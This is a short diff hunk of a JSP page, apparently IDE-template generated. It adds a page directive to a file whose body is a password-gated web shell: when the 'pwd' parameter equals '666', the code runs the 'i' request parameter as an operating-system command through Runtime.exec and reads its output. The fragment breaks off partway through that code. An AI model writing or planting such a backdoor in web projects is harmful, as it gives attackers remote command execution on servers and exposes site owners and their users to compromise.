@@ -5,6 +5,7 @@
   Time: 12:03
   To change this template use File | Settings | File Templates.
 --%>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%
     if ("666".equals(request.getParameter("pwd"))) {
         java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
